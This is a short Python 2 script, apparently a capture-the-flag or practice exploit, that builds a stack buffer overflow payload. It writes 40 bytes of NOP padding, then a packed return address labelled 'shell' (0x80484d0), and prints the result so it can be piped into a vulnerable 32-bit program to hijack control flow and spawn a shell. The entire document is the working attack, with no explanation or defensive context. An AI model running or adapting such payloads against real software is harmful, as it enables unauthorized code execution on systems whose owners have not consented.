from struct import *

p = lambda x : pack("<L", x)

shell = 0x80484d0

payload = ""
payload += "\x90"*(56-16)
payload += p(shell)

print payload